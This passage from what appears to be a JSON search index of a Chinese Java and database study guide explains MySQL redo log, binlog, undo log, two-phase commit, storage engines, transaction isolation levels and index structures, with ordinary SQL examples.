log记录就一定在硬盘里，不会有任何数据丢失。\n如果事务执行期间MySQL挂了或宕机，这部分日志丢了，但是事务并没有提交，所以日志丢了也不会有损失。\ninnodb_flush_log_at_trx_commit=2    为2时， 只要事务提交成功，redo log buffer中的内容只写入文件系统缓存（page cache）。\n如果仅仅只是MySQL挂了不会有任何数据丢失，但是宕机可能会有1秒数据的丢失。\n日志文件组    硬盘上存储的 redo log 日志文件不只一个，而是以一个日志文件组的形式出现的，每个的redo日志文件大小都是一样的。\n比如可以配置为一组4个文件，每个文件的大小是 1GB，整个 redo log 日志文件组可以记录4G的内容。\n它采用的是环形数组形式，从头开始写，写到末尾又回到头循环写，如下图所示。\n在个日志文件组中还有两个重要的属性，分别是 write pos、checkpoint\n write pos 是当前记录的位置，一边写一边后移 checkpoint 是当前要擦除的位置，也是往后推移  每次刷盘 redo log 记录到日志文件组中，write pos 位置就会后移更新。\n每次 MySQL 加载日志文件组恢复数据时，会清空加载过的 redo log 记录，并把 checkpoint 后移更新。\nwrite pos 和 checkpoint 之间的还空着的部分可以用来写入新的 redo log 记录。\n如果 write pos 追上 checkpoint ，表示日志文件组满了，这时候不能再写入新的 redo log 记录，MySQL 得停下来，清空一些记录，把 checkpoint 推进一下。\nredo log 小结    相信大家都知道 redo log 的作用和它的刷盘时机、存储形式。\n现在我们来思考一个问题： 只要每次把修改后的数据页直接刷盘不就好了，还有 redo log 什么事？\n它们不都是刷盘么？差别在哪里？\n1 Byte = 8bit 1 KB = 1024 Byte 1 MB = 1024 KB 1 GB = 1024 MB 1 TB = 1024 GB 实际上，数据页大小是16KB，刷盘比较耗时，可能就修改了数据页里的几 Byte 数据，有必要把完整的数据页刷盘吗？\n而且数据页刷盘是随机写，因为一个数据页对应的位置可能在硬盘文件的随机位置，所以性能是很差。\n如果是写 redo log，一行记录可能就占几十 Byte，只包含表空间号、数据页号、磁盘文件偏移 量、更新值，再加上是顺序写，所以刷盘速度很快。\n所以用 redo log 形式记录修改内容，性能会远远超过刷数据页的方式，这也让数据库的并发能力更强。\n 其实内存的数据页在一定时机也会刷盘，我们把这称为页合并，讲 Buffer Pool的时候会对这块细说\n binlog    redo log 它是物理日志，记录内容是“在某个数据页上做了什么修改”，属于 InnoDB 存储引擎。\n而 binlog 是逻辑日志，记录内容是语句的原始逻辑，类似于“给 ID=2 这一行的 c 字段加 1”，属于MySQL Server 层。\n不管用什么存储引擎，只要发生了表数据更新，都会产生 binlog 日志。\n那 binlog 到底是用来干嘛的？\n可以说MySQL数据库的数据备份、主备、主主、主从都离不开binlog，需要依靠binlog来同步数据，保证数据一致性。\nbinlog会记录所有涉及更新数据的逻辑操作，并且是顺序写。\n记录格式    binlog 日志有三种格式，可以通过binlog_format参数指定。\n statement row mixed  指定statement，记录的内容是SQL语句原文，比如执行一条update T set update_time=now() where id=1，记录的内容如下。\n同步数据时，会执行记录的SQL语句，但是有个问题，update_time=now()这里会获取当前系统时间，直接执行会导致与原库的数据不一致。\n为了解决这种问题，我们需要指定为row，记录的内容不再是简单的SQL语句了，还包含操作的具体数据，记录内容如下。\nrow格式记录的内容看不到详细信息，要通过mysqlbinlog工具解析出来。\nupdate_time=now()变成了具体的时间update_time=1627112756247，条件后面的@1、@2、@3 都是该行数据第 1 个~3 个字段的原始值（假设这张表只有 3 个字段）。\n这样就能保证同步数据的一致性，通常情况下都是指定为row，这样可以为数据库的恢复与同步带来更好的可靠性。\n但是这种格式，需要更大的容量来记录，比较占用空间，恢复与同步时会更消耗IO资源，影响执行速度。\n所以就有了一种折中的方案，指定为mixed，记录的内容是前两者的混合。\nMySQL会判断这条SQL语句是否可能引起数据不一致，如果是，就用row格式，否则就用statement格式。\n写入机制    binlog的写入时机也非常简单，事务执行过程中，先把日志写到binlog cache，事务提交的时候，再把binlog cache写到binlog文件中。\n因为一个事务的binlog不能被拆开，无论这个事务多大，也要确保一次性写入，所以系统会给每个线程分配一个块内存作为binlog cache。\n我们可以通过binlog_cache_size参数控制单个线程 binlog cache 大小，如果存储内容超过了这个参数，就要暂存到磁盘（Swap）。\nbinlog日志刷盘流程如下\n 上图的 write，是指把日志写入到文件系统的 page cache，并没有把数据持久化到磁盘，所以速度比较快 上图的 fsync，才是将数据持久化到磁盘的操作  write和fsync的时机，可以由参数sync_binlog控制，默认是0。\n为0的时候，表示每次提交事务都只write，由系统自行判断什么时候执行fsync。\n虽然性能得到提升，但是机器宕机，page cache里面的 binglog 会丢失。\n为了安全起见，可以设置为1，表示每次提交事务都会执行fsync，就如同binlog 日志刷盘流程一样。\n最后还有一种折中方式，可以设置为N(N\u0026gt;1)，表示每次提交事务都write，但累积N个事务后才fsync。\n在出现IO瓶颈的场景里，将sync_binlog设置成一个比较大的值，可以提升性能。\n同样的，如果机器宕机，会丢失最近N个事务的binlog日志。\n两阶段提交    redo log（重做日志）让InnoDB存储引擎拥有了崩溃恢复能力。\nbinlog（归档日志）保证了MySQL集群架构的数据一致性。\n虽然它们都属于持久化的保证，但是侧重点不同。\n在执行更新语句过程，会记录redo log与binlog两块日志，以基本的事务为单位，redo log在事务执行过程中可以不断写入，而binlog只有在提交事务时才写入，所以redo log与binlog的写入时机不一样。\n回到正题，redo log与binlog两份日志之间的逻辑不一致，会出现什么问题？\n我们以update语句为例，假设id=2的记录，字段c值是0，把字段c值更新成1，SQL语句为update T set c=1 where id=2。\n假设执行过程中写完redo log日志后，binlog日志写期间发生了异常，会出现什么情况呢？\n由于binlog没写完就异常，这时候binlog里面没有对应的修改记录。因此，之后用binlog日志恢复数据时，就会少这一次更新，恢复出来的这一行c值是0，而原库因为redo log日志恢复，这一行c值是1，最终数据不一致。\n为了解决两份日志之间的逻辑一致问题，InnoDB存储引擎使用两阶段提交方案。\n原理很简单，将redo log的写入拆成了两个步骤prepare和commit，这就是两阶段提交。\n使用两阶段提交后，写入binlog时发生异常也不会有影响，因为MySQL根据redo log日志恢复数据时，发现redo log还处于prepare阶段，并且没有对应binlog日志，就会回滚该事务。\n再看一个场景，redo log设置commit阶段发生异常，那会不会回滚事务呢？\n并不会回滚事务，它会执行上图框住的逻辑，虽然redo log是处于prepare阶段，但是能通过事务id找到对应的binlog日志，所以MySQL认为是完整的，就会提交事务恢复数据。\nundo log     这部分内容为 JavaGuide 的补充：\n 我们知道如果想要保证事务的原子性，就需要在异常发生时，对已经执行的操作进行回滚，在 MySQL 中，恢复机制是通过 回滚日志（undo log） 实现的，所有事务进行的修改都会先记录到这个回滚日志中，然后再执行相关的操作。如果执行过程中遇到异常的话，我们直接利用 回滚日志 中的信息将数据回滚到修改之前的样子即可！并且，回滚日志会先于数据持久化到磁盘上。这样就保证了即使遇到数据库突然宕机等情况，当用户再次启动数据库的时候，数据库还能够通过查询回滚日志来回滚将之前未完成的事务。\n另外，MVCC 的实现依赖于：隐藏字段、Read View、undo log。在内部实现中，InnoDB 通过数据行的 DB_TRX_ID 和 Read View 来判断数据的可见性，如不可见，则通过数据行的 DB_ROLL_PTR 找到 undo log 中的历史版本。每个事务读到的数据版本可能是不一样的，在同一个事务中，用户只能看到该事务创建 Read View 之前已经提交的修改和该事务本身做的修改\n总结     这部分内容为 JavaGuide 的补充：\n MySQL InnoDB 引擎使用 redo log(重做日志) 保证事务的持久性，使用 undo log(回滚日志) 来保证事务的原子性。\nMySQL数据库的数据备份、主备、主主、主从都离不开binlog，需要依靠binlog来同步数据，保证数据一致性。\n站在巨人的肩膀上     《MySQL 实战 45 讲》 《从零开始带你成为 MySQL 实战优化高手》 《MySQL 是怎样运行的：从根儿上理解 MySQL》 《MySQL 技术 Innodb 存储引擎》  MySQL 好文推荐     CURD 这么多年，你有了解过 MySQL 的架构设计吗？ 浅谈 MySQL InnoDB 的内存组件  "},{"id":272,"href":"/database/mysql/MySQL%E6%80%BB%E7%BB%93/","title":"MySQL总结","parent":"mysql","content":"MySQL 基础    关系型数据库介绍    顾名思义，关系型数据库就是一种建立在关系模型的基础上的数据库。关系模型表明了数据库中所存储的数据之间的联系（一对一、一对多、多对多）。\n关系型数据库中，我们的数据都被存放在了各种表中（比如用户表），表中的每一行就存放着一条数据（比如一个用户的信息）。\n大部分关系型数据库都使用 SQL 来操作数据库中的数据。并且，大部分关系型数据库都支持事务的四大特性(ACID)。\n有哪些常见的关系型数据库呢？\nMySQL、PostgreSQL、Oracle、SQL Server、SQLite（微信本地的聊天记录的存储就是用的 SQLite） \u0026hellip;\u0026hellip;。\nMySQL 介绍    MySQL 是一种关系型数据库，主要用于持久化存储我们的系统中的一些数据比如用户信息。\n由于 MySQL 是开源免费并且比较成熟的数据库，因此，MySQL 被大量使用在各种系统中。任何人都可以在 GPL(General Public License) 的许可下下载并根据个性化的需要对其进行修改。MySQL 的默认端口号是3306。\n存储引擎    存储引擎相关的命令    查看 MySQL 提供的所有存储引擎\nmysql\u0026gt; show engines; 从上图我们可以查看出 MySQL 当前默认的存储引擎是 InnoDB，并且在 5.7 版本所有的存储引擎中只有 InnoDB 是事务性存储引擎，也就是说只有 InnoDB 支持事务。\n查看 MySQL 当前默认的存储引擎\n我们也可以通过下面的命令查看默认的存储引擎。\nmysql\u0026gt; show variables like \u0026#39;%storage_engine%\u0026#39;; 查看表的存储引擎\nshow table status like \u0026#34;table_name\u0026#34; ; MyISAM 和 InnoDB 的区别    MySQL 5.5 之前，MyISAM 引擎是 MySQL 的默认存储引擎，可谓是风光一时。\n虽然，MyISAM 的性能还行，各种特性也还不错（比如全文索引、压缩、空间函数等）。但是，MyISAM 不支持事务和行级锁，而且最大的缺陷就是崩溃后无法安全恢复。\n5.5 版本之后，MySQL 引入了 InnoDB（事务性数据库引擎），MySQL 5.5 版本后默认的存储引擎为 InnoDB。小伙子，一定要记好这个 InnoDB ，你每次使用 MySQL 数据库都是用的这个存储引擎吧？\n言归正传！咱们下面还是来简单对比一下两者：\n1.是否支持行级锁\nMyISAM 只有表级锁(table-level locking)，而 InnoDB 支持行级锁(row-level locking)和表级锁,默认为行级锁。\n也就说，MyISAM 一锁就是锁住了整张表，这在并发写的情况下是多么滴憨憨啊！这也是为什么 InnoDB 在并发写的时候，性能更牛皮了！\n2.是否支持事务\nMyISAM 不提供事务支持。\nInnoDB 提供事务支持，具有提交(commit)和回滚(rollback)事务的能力。\n3.是否支持外键\nMyISAM 不支持，而 InnoDB 支持。\n🌈 拓展一下：\n一般我们也是不建议在数据库层面使用外键的，应用层面可以解决。不过，这样会对数据的一致性造成威胁。具体要不要使用外键还是要根据你的项目来决定。\n4.是否支持数据库异常崩溃后的安全恢复\nMyISAM 不支持，而 InnoDB 支持。\n使用 InnoDB 的数据库在异常崩溃后，数据库重新启动的时候会保证数据库恢复到崩溃前的状态。这个恢复的过程依赖于 redo log 。\n🌈 拓展一下：\n MySQL InnoDB 引擎使用 redo log(重做日志) 保证事务的持久性，使用 undo log(回滚日志) 来保证事务的原子性。 MySQL InnoDB 引擎通过 锁机制、MVCC 等手段来保证事务的隔离性（ 默认支持的隔离级别是 REPEATABLE-READ ）。 保证了事务的持久性、原子性、隔离性之后，一致性才能得到保障。  5.是否支持 MVCC\nMyISAM 不支持，而 InnoDB 支持。\n讲真，这个对比有点废话，毕竟 MyISAM 连行级锁都不支持。\nMVCC 可以看作是行级锁的一个升级，可以有效减少加锁操作，提供性能。\n关于 MyISAM 和 InnoDB 的选择问题    大多数时候我们使用的都是 InnoDB 存储引擎，在某些读密集的情况下，使用 MyISAM 也是合适的。不过，前提是你的项目不介意 MyISAM 不支持事务、崩溃恢复等缺点（可是~我们一般都会介意啊！）。\n《MySQL 高性能》上面有一句话这样写到:\n 不要轻易相信“MyISAM 比 InnoDB 快”之类的经验之谈，这个结论往往不是绝对的。在很多我们已知场景中，InnoDB 的速度都可以让 MyISAM 望尘莫及，尤其是用到了聚簇索引，或者需要访问的数据都可以放入内存的应用。\n 一般情况下我们选择 InnoDB 都是没有问题的，但是某些情况下你并不在乎可扩展能力和并发能力，也不需要事务支持，也不在乎崩溃后的安全恢复问题的话，选择 MyISAM 也是一个不错的选择。但是一般情况下，我们都是需要考虑到这些问题的。\n因此，对于咱们日常开发的业务系统来说，你几乎找不到什么理由再使用 MyISAM 作为自己的 MySQL 数据库的存储引擎。\n锁机制与 InnoDB 锁算法    MyISAM 和 InnoDB 存储引擎使用的锁：\n MyISAM 采用表级锁(table-level locking)。 InnoDB 支持行级锁(row-level locking)和表级锁,默认为行级锁  表级锁和行级锁对比：\n 表级锁： MySQL 中锁定 粒度最大 的一种锁，对当前操作的整张表加锁，实现简单，资源消耗也比较少，加锁快，不会出现死锁。其锁定粒度最大，触发锁冲突的概率最高，并发度最低，MyISAM 和 InnoDB 引擎都支持表级锁。 行级锁： MySQL 中锁定 粒度最小 的一种锁，只针对当前操作的行进行加锁。 行级锁能大大减少数据库操作的冲突。其加锁粒度最小，并发度高，但加锁的开销也最大，加锁慢，会出现死锁。  InnoDB 存储引擎的锁的算法有三种：\n Record lock：记录锁，单个行记录上的锁 Gap lock：间隙锁，锁定一个范围，不包括记录本身 Next-key lock：record+gap 临键锁，锁定一个范围，包含记录本身  查询缓存    执行查询语句的时候，会先查询缓存。不过，MySQL 8.0 版本后移除，因为这个功能不太实用\nmy.cnf 加入以下配置，重启 MySQL 开启查询缓存\nquery_cache_type=1 query_cache_size=600000 MySQL 执行以下命令也可以开启查询缓存\nset global query_cache_type=1; set global query_cache_size=600000; 如上，开启查询缓存后在同样的查询条件以及数据情况下，会直接在缓存中返回结果。这里的查询条件包括查询本身、当前要查询的数据库、客户端协议版本号等一些可能影响结果的信息。（查询缓存不命中的情况：（1））因此任何两个查询在任何字符上的不同都会导致缓存不命中。此外，（查询缓存不命中的情况：（2））如果查询中包含任何用户自定义函数、存储函数、用户变量、临时表、MySQL 库中的系统表，其查询结果也不会被缓存。\n（查询缓存不命中的情况：（3））缓存建立之后，MySQL 的查询缓存系统会跟踪查询中涉及的每张表，如果这些表（数据或结构）发生变化，那么和这张表相关的所有缓存数据都将失效。\n缓存虽然能够提升数据库的查询性能，但是缓存同时也带来了额外的开销，每次查询后都要做一次缓存操作，失效后还要销毁。 因此，开启查询缓存要谨慎，尤其对于写密集的应用来说更是如此。如果开启，要注意合理控制缓存空间大小，一般来说其大小设置为几十 MB 比较合适。此外，还可以通过 sql_cache 和 sql_no_cache 来控制某个查询语句是否需要缓存：\nselect sql_no_cache count(*) from usr; 事务    何为事务？    一言蔽之，事务是逻辑上的一组操作，要么都执行，要么都不执行。\n可以简单举一个例子不？\n事务最经典也经常被拿出来说例子就是转账了。假如小明要给小红转账 1000 元，这个转账会涉及到两个关键操作就是：\n 将小明的余额减少 1000 元 将小红的余额增加 1000 元。  事务会把这两个操作就可以看成逻辑上的一个整体，这个整体包含的操作要么都成功，要么都要失败。\n这样就不会出现小明余额减少而小红的余额却并没有增加的情况。\n何为数据库事务？    数据库事务在我们日常开发中接触的最多了。如果你的项目属于单体架构的话，你接触到的往往就是数据库事务了。\n平时，我们在谈论事务的时候，如果没有特指分布式事务，往往指的就是数据库事务。\n那数据库事务有什么作用呢？\n简单来说：数据库事务可以保证多个对数据库的操作（也就是 SQL 语句）构成一个逻辑上的整体。构成这个逻辑上的整体的这些数据库操作遵循：要么全部执行成功,要么全部不执行 。\n# 开启一个事务 START TRANSACTION; # 多条 SQL 语句 SQL1,SQL2... ## 提交事务 COMMIT; 另外，关系型数据库（例如：MySQL、SQL Server、Oracle 等）事务都有 ACID 特性：\n何为 ACID 特性呢？     原子性（Atomicity） ： 事务是最小的执行单位，不允许分割。事务的原子性确保动作要么全部完成，要么完全不起作用； 一致性（Consistency）： 执行事务前后，数据保持一致，例如转账业务中，无论事务是否成功，转账者和收款人的总额应该是不变的； 隔离性（Isolation）： 并发访问数据库时，一个用户的事务不被其他事务所干扰，各并发事务之间数据库是独立的； 持久性（Durability）： 一个事务被提交之后。它对数据库中数据的改变是持久的，即使数据库发生故障也不应该对其有任何影响。  数据事务的实现原理呢？\n我们这里以 MySQL 的 InnoDB 引擎为例来简单说一下。\nMySQL InnoDB 引擎使用 redo log(重做日志) 保证事务的持久性，使用 undo log(回滚日志) 来保证事务的原子性。\nMySQL InnoDB 引擎通过 锁机制、MVCC 等手段来保证事务的隔离性（ 默认支持的隔离级别是 REPEATABLE-READ ）。\n保证了事务的持久性、原子性、隔离性之后，一致性才能得到保障。\n并发事务带来哪些问题?    在典型的应用程序中，多个事务并发运行，经常会操作相同的数据来完成各自的任务（多个用户对同一数据进行操作）。并发虽然是必须的，但可能会导致以下的问题。\n 脏读（Dirty read）: 当一个事务正在访问数据并且对数据进行了修改，而这种修改还没有提交到数据库中，这时另外一个事务也访问了这个数据，然后使用了这个数据。因为这个数据是还没有提交的数据，那么另外一个事务读到的这个数据是“脏数据”，依据“脏数据”所做的操作可能是不正确的。 丢失修改（Lost to modify）: 指在一个事务读取一个数据时，另外一个事务也访问了该数据，那么在第一个事务中修改了这个数据后，第二个事务也修改了这个数据。这样第一个事务内的修改结果就被丢失，因此称为丢失修改。 例如：事务 1 读取某表中的数据 A=20，事务 2 也读取 A=20，事务 1 修改 A=A-1，事务 2 也修改 A=A-1，最终结果 A=19，事务 1 的修改被丢失。 不可重复读（Unrepeatable read）: 指在一个事务内多次读同一数据。在这个事务还没有结束时，另一个事务也访问该数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改导致第一个事务两次读取的数据可能不太一样。这就发生了在一个事务内两次读到的数据是不一样的情况，因此称为不可重复读。 幻读（Phantom read）: 幻读与不可重复读类似。它发生在一个事务（T1）读取了几行数据，接着另一个并发事务（T2）插入了一些数据时。在随后的查询中，第一个事务（T1）就会发现多了一些原本不存在的记录，就好像发生了幻觉一样，所以称为幻读。  不可重复读和幻读区别：\n不可重复读的重点是修改比如多次读取一条记录发现其中某些列的值被修改，幻读的重点在于新增或者删除比如多次读取一条记录发现记录增多或减少了。\n事务隔离级别有哪些?    SQL 标准定义了四个隔离级别：\n READ-UNCOMMITTED(读取未提交)： 最低的隔离级别，允许读取尚未提交的数据变更，可能会导致脏读、幻读或不可重复读。 READ-COMMITTED(读取已提交)： 允许读取并发事务已经提交的数据，可以阻止脏读，但是幻读或不可重复读仍有可能发生。 REPEATABLE-READ(可重复读)： 对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，可以阻止脏读和不可重复读，但幻读仍有可能发生。 SERIALIZABLE(可串行化)： 最高的隔离级别，完全服从 ACID 的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，该级别可以防止脏读、不可重复读以及幻读。      隔离级别 脏读 不可重复读 幻读     READ-UNCOMMITTED √ √ √   READ-COMMITTED × √ √   REPEATABLE-READ × × √   SERIALIZABLE × × ×    MySQL 的默认隔离级别是什么?    MySQL InnoDB 存储引擎的默认支持的隔离级别是 REPEATABLE-READ（可重读）。我们可以通过SELECT @@tx_isolation;命令来查看，MySQL 8.0 该命令改为SELECT @@transaction_isolation;\nmysql\u0026gt; SELECT @@tx_isolation; +-----------------+ | @@tx_isolation | +-----------------+ | REPEATABLE-READ | +-----------------+ 这里需要注意的是：与 SQL 标准不同的地方在于 InnoDB 存储引擎在 REPEATABLE-READ（可重读） 事务隔离级别下使用的是 Next-Key Lock 锁算法，因此可以避免幻读的产生，这与其他数据库系统(如 SQL Server)是不同的。所以说 InnoDB 存储引擎的默认支持的隔离级别是 REPEATABLE-READ（可重读） 已经可以完全保证事务的隔离性要求，即达到了 SQL 标准的 SERIALIZABLE(可串行化) 隔离级别。\n🐛 问题更正：MySQL InnoDB 的 REPEATABLE-READ（可重读）并不保证避免幻读，需要应用使用加锁读来保证。而这个加锁度使用到的机制就是 Next-Key Locks。\n因为隔离级别越低，事务请求的锁越少，所以大部分数据库系统的隔离级别都是 READ-COMMITTED(读取提交内容) ，但是你要知道的是 InnoDB 存储引擎默认使用 REPEATABLE-READ（可重读） 并不会有任何性能损失。\nInnoDB 存储引擎在 分布式事务 的情况下一般会用到 SERIALIZABLE(可串行化) 隔离级别。\n🌈 拓展一下(以下内容摘自《MySQL 技术内幕：InnoDB 存储引擎(第 2 版)》7.7 章)：\n InnoDB 存储引擎提供了对 XA 事务的支持，并通过 XA 事务来支持分布式事务的实现。分布式事务指的是允许多个独立的事务资源（transactional resources）参与到一个全局的事务中。事务资源通常是关系型数据库系统，但也可以是其他类型的资源。全局事务要求在其中的所有参与的事务要么都提交，要么都回滚，这对于事务原有的 ACID 要求又有了提高。另外，在使用分布式事务时，InnoDB 存储引擎的事务隔离级别必须设置为 SERIALIZABLE。\n 参考     《高性能 MySQL》 https://www.omnisci.com/technical-glossary/relational-database  "},{"id":273,"href":"/database/mysql/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B4%A2%E5%BC%95/","title":"MySQL数据库索引","parent":"mysql","content":"何为索引？有什么作用？    索引是一种用于快速查询和检索数据的数据结构。常见的索引结构有: B 树， B+树和 Hash。\n索引的作用就相当于目录的作用。打个比方: 我们在查字典的时候，如果没有目录，那我们就只能一页一页的去找我们需要查的那个字，速度很慢。如果有目录了，我们只需要先去目录里查找字的位置，然后直接翻到那一页就行了。\n索引的优缺点    优点 ：\n 使用索引可以大大加快 数据的检索速度（大大减少检索的数据量）, 这也是创建索引的最主要的原因。 通过创建唯一性索引，可以保证数据库表中每一行数据的唯一性。  缺点 ：\n 创建索引和维护索引需要耗费许多时间。当对表中的数据进行增删改的时候，如果数据有索引，那么索引也需要动态的修改，会降低 SQL 执行效率。 索引需要使用物理文件存储，也会耗费一定空间。  但是，使用索引一定能提高查询性能吗?\n大多数情况下，索引查询都是比全表扫描要快的。但是如果数据库的数据量不大，那么使用索引也不一定能够带来很大提升。\n索引的底层数据结构    Hash表 \u0026amp; B+树    哈希表是键值对的集合，通过键(key)即可快速取出对应的值(value)，因此哈希表可以快速检索数据（接近 O（1））。\n为何能够通过 key 快速取出 value呢？ 原因在于 哈希算法（也叫散列算法）。通过哈希算法，我们可以快速找到 value 对应的 index，找到了 index 也就找到了对应的 value。\nhash = hashfunc(key) index = hash % array_size 但是！哈希算法有个 Hash 冲突 问题，也就是说多个不同的 key 最后得到的 index 相同。通常情况下，我们常用的解决办法是 链地址法。链地址法就是将哈希冲突数据存放在链表中。就比如 JDK1.8 之前 HashMap 就是通过链地址法来解决哈希冲突的。不过，JDK1.8 以后HashMap为了减少链表过长的时候搜索时间过长引入了红黑树。\n为了减少 Hash 冲突的发生，一个好的哈希函数应该“均匀地”将数据分布在整个可能的哈希值集合中。\n既然哈希表这么快，为什么MySQL 没有使用其作为索引的数据结构呢？\n1.Hash 冲突问题 ：我们上面也提到过Hash 冲突了，不过对于数据库来说这还不算最大的缺点。\n2.Hash 索引不支持顺序和范围查询(Hash 索引不支持顺序和范围查询是它最大的缺点： 假如我们要对表中的数据进行排序或者进行范围查询，那 Hash 索引可就不行了。\n试想一种情况:\nSELECT * FROM tb1 WHERE id \u0026lt; 500;Copy to clipboardErrorCopied 在这种范围查询中，优势非常大，直接遍历比 500 小的叶子节点就够了。而 Hash 索引是根据 hash 算法来定位的，难不成还要把 1 - 499 的数据，每个都进行一次 hash 计算来定位吗?这就是 Hash 最大的缺点了。\nB 树\u0026amp; B+树    B 树也称 B-树,全称为 多路平衡查找树 ，B+ 树是 B 树的一种变体。B 树和 B+树中的 B 是 Balanced （平衡）的意思。\n目前大部分数据库系统及文件系统都采用 B-Tree 或其变种 B+Tree 作为索引结构。\nB 树\u0026amp; B+树两者有何异同呢？\n B 树的所有节点既存放键(key) 也存放 数据(data)，而 B+树只有叶子节点存放 key 和 data，其他内节点只存放 key。 B 树的叶子节点都是独立的;B+树的叶子节点有一条引用链指向与它相邻的叶子节点。 B 树的检索的过程相当于对范围内的每个节点的关键字做二分查找，可能还没有到达叶子节点，检索就结束了。而 B+树的检索效率就很稳定了，任何查找都是从根节点到叶子节点的过程，叶子节点的顺序检索很明显。  在 MySQL 中，MyISAM 引擎和 InnoDB 引擎都是使用 B+Tree 作为索引结构，但是，两者的实现方式不太一样。（下面的内容整理自《Java 工程师修炼之道》）\nMyISAM 引擎中，B+Tree 叶节点的 data 域存放的是数据记录的地址。在索引检索的时候，首先按照 B+Tree 搜索算法搜索索引，如果指定的 Key 存在，则取出其 data 域的值，然后以 data 域的值为地址读取相应的数据记录。这被称为“非聚簇索引”。\nInnoDB 引擎中，其数据文件本身就是索引文件。相比 MyISAM，索引文件和数据文件是分离的，其表数据文件本身就是按 B+Tree 组织的一个索引结构，树的叶节点 data 域保存了完整的数据记录。这个索引的 key 是数据表的主键，因此 InnoDB 表数据文件本身就是主索引。这被称为“聚簇索引（或聚集索引）”，而其余的索引都作为辅助索引，辅助索引的 data 域存储相应记录主键的值而不是地址，这也是和 MyISAM 不同的地方。在根据主索引搜索时，直接找到 key 所在的节点即可取出数据；在根据辅助索引查找时，则需要先取出主键的值，在走一遍主索引。 因此，在设计表的时候，不建议使用过长的字段作为主键，也不建议使用非单调的字段作为主键，这样会造成主索引频繁分裂。\n索引类型    主键索引(Primary Key)    数据表的主键列使用的就是主键索引。\n一张数据表有只能有一个主键，并且主键不能为 null，不能重复。\n在 MySQL 的 InnoDB 的表中，当没有显示的指定表的主键时，InnoDB 会自动先检查表中是否有唯一索引的字段，如果有，则选择该字段为默认的主键，否则 InnoDB 将会自动创建一个 6Byte 的自增主键。\n二级索引(辅助索引)    二级索引又称为辅助索引，是因为二级索引的叶子节点存储的数据是主键。也就是说，通过二级索引，可以定位主键的位置。\n唯一索引，普通索引，前缀索引等索引属于二级索引。\nPS:不懂的同学可以暂存疑，慢慢往下看，后面会有答案的，也可以自行搜索。\n 唯一索引(Unique Key) ：唯一索引也是一种约束。唯一索引的属性列不能出现重复的数据，但是允许数据为 NULL，一张表允许创建多个唯一索引。 建立唯一索引的目的大部分时候都是为了该属性列的数据的唯一性，而不是为了查询效率。 普通索引(Index) ：普通索引的唯一作用就是为了快速查询数据，一张表允许创建多个普通索引，并允许数据重复和 NULL。 前缀索引(Prefix) ：前缀索引只适用于字符串类型的数据。前缀索引是对文本的前几个字符创建索引，相比普通索引建立的数据更小， 因为只取前几个字符。 全文索引(Full Text) ：全文索引主要是为了检索大文本数据中的关键字的信息，是目前搜索引擎数据库使用的一种技术。Mysql5.6 之前只有 MYISAM 引擎支持全文索引，5.6 之后 InnoDB 也支持了全文索引。  二级索引: 聚集索引与非聚集索引    聚集索引    聚集索引即索引结构和数据一起存放的索引。主键索引属于聚集索引。\n在 Mysql 中，InnoDB 引擎的表的 .ibd文件就包含了该表的索引和数据，对于 InnoDB 引擎表来说，该表的索引(B+树)的每个非叶子节点存储索引，叶子节点存储索引和索引对应的数据。\n聚集索引的优点    聚集索引的查询速度非常的快，因为整个 B+树本身就是一颗多叉平衡树，叶子节点也都是有序的，定位到索引的节点，就相当于定位到了数据。\n聚集索引的缺点     依赖于有序的数据 ：因为 B+树是多路平衡树，如果索引的数据不是有序的，那么就需要在插入时排序，如果数据是整型还好，否则类似于字符串或 UUID 这种又长又难比较的数据，插入或查找的速度肯定比较慢。 更新代价大 ： 如果对索引列的数据被修改时，那么对应的索引也将会被修改， 而且况聚集索引的叶子节点还存放着数据，修改代价肯定是较大的， 所以对于主键索引来说，主键一般都是不可被修改的。  非聚集索引    非聚集索引即索引结构和数据分开存放的索引。\n二级索引属于非聚集索引。\n MYISAM 引擎的表的.MYI 文件包含了表的索引， 该表的索引(B+树)的每个叶子非叶子节点存储索引， 叶子节点存储索引和索引对应数据的指针，指向.MYD 文件的数据。\n非聚集索引的叶子节点并不一定存放数据的指针， 因为二级索引的叶子节点就存放的是主键，根据主键再回表查数据。\n 非聚集索引的优点    更新代价比聚集索引要小 。非聚集索引的更新代价就没有聚集索引那么大了，非聚集索引的叶子节点是不存放数据的\n非聚集索引的缺点     跟聚集索引一样，非聚集索引也依赖于有序的数据 可能会二次查询(回表) :这应该是非聚集索引最大的缺点了。 当查到索引对应的指针或主键后，可能还需要根据指针或主键再到数据文件或表中查询。  这是 MySQL 的表的文件截图:\n聚集索引和非聚集索引:\n非聚集索引一定回表查询吗(覆盖索引)?    非聚集索引不一定回表查询。\n 试想一种情况，用户准备使用 SQL 查询用户名，而用户名字段正好建立了索引。\n SELECT name FROM table WHERE name=\u0026#39;guang19\u0026#39;;  那么这个索引的 key 本身就是 name，查到对应的 name 直接返回就行了，无需回表查询。\n 即使是 MYISAM 也是这样，虽然 MYISAM 的主键索引确实需要回表， 因为它的主键索引的叶子节点存放的是指针。但是如果 SQL 查的就是主键呢?\nSELECT id FROM table WHERE id=1; 主键索引本身的 key 就是主键，查到返回就行了。这种情况就称之为覆盖索引了。\n覆盖索引    如果一个索引包含（或者说覆盖）所有需要查询的字段的值，我们就称之为“覆盖索引”。我们知道在 InnoDB 存储引擎中，如果不是主键索引，叶子节点存储的是主键+列值。最终还是要“回表”，也就是要通过主键再查找一次。这样就会比较慢覆盖索引就是把要查询出的列和索引是对应的，不做回表操作！\n覆盖索引即需要查询的字段正好是索引的字段，那么直接根据该索引，就可以查到数据了， 而无需回表查询。\n 如主键索引，如果一条 SQL 需要查询主键，那么正好根据主键索引就可以查到主键。\n再如普通索引，如果一条 SQL 需要查询 name，name 字段正好有索引， 那么直接根据这个索引就可以查到数据，也无需回表。\n 覆盖索引: 创建索引的注意事项    1.选择合适的字段创建索引：\n 不为 NULL 的字段 ：索引字段的数据应该尽量不为 NULL，因为对于数据为 NULL 的字段，数据库较难优化。如果字段频繁被查询，但又避免不了为 NULL，建议使用 0,1,true,false 这样语义较为清晰的短值或短字符作为替代。 被频繁查询的字段 ：我们创建索引的字段应该是查询操作非常频繁的字段。 被作为条件查询的字段 ：被作为 WHERE 条件查询的字段，应该被考虑建立索引。 频繁需要排序的字段 